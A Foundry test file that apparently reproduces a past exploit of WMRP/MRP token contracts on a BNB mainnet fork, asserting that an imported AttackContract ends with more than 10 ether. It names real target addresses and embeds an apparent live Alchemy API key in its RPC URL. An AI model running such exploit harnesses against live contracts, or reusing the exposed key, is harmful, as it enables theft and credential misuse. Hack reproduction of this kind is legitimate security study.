// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {AttackContract, WBNB} from "./AttackContract.sol";

contract ExecuteAttack is Test {
    AttackContract public attackContract;
    // vulnerable contract to be exploited
    address wmrp = 0x35F5cEf517317694DF8c50C894080caA8c92AF7D;
    address mrp = 0xA0Ba9d82014B33137B195b5753F3BC8Bf15700a3;

    address pancakeSwap = 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;
    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    string bnbRpcUrl =
        "https://bnb-mainnet.g.alchemy.com/v2/TUf93oCEcXKkBYyClhwka_UL3opBM_KY";

    uint256 bnbForkId;
    uint blockNumberBeforeHack = 40122169;
    bytes32 hackTransactionHash =
        bytes32(
            0x4353a6d37e95a0844f511f0ea9300ef3081130b24f0cf7a4bd1cae26ec393101
        );

    // bytes32 transactionOfHack = bytes32("0x4353a6d37e95a0844f511f0ea9300ef3081130b24f0cf7a4bd1cae26ec393101");

    function setUp() public {
        vm.label(pancakeSwap, "PancakeSwap");
        vm.label(wmrp, "WMRP");
        vm.label(mrp, "MRP");
        vm.label(wbnb, "WBNB");
        vm.label(
            0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82,
            "PancakeSwap Token"
        );
        attackContract = new AttackContract(pancakeSwap, wmrp, mrp, wbnb);
        // Fork bnb at the block number just before the hash
        bnbForkId = vm.createSelectFork(bnbRpcUrl, hackTransactionHash);
    }

    function test_steal_funds() public {
        uint attackerBalanceBefore = address(attackContract).balance;
        attackContract.attack();
        uint attackerBalanceAfter = address(attackContract).balance;
        assertGt(
            attackerBalanceAfter,
            attackerBalanceBefore,
            "Attacker balance should increase after hack"
        );
        // This proves the attacker ended with more than 10 eth in it's balance haven started with nothing
        assertGt(
            attackerBalanceAfter,
            10 ether,
            "Attacker balance should be greater than 10 ether"
        );
    }

    function test_withdraw() public {
        address user = 0x2Bd8980A925E6f5a910be8Cc0Ad1CfF663E62d9D;
        vm.startPrank(user);
        uint wbnbBalance = WBNB(wbnb).balanceOf(user);
        console.log("wbnbBalance", wbnbBalance);
        uint wmrpBalance = WBNB(wmrp).balanceOf(user);
        console.log("wmrpBalance", wmrpBalance);
        uint mrpBalance = WBNB(mrp).balanceOf(user);
        console.log("mrpBalance", mrpBalance);
        vm.stopPrank();
    }
}
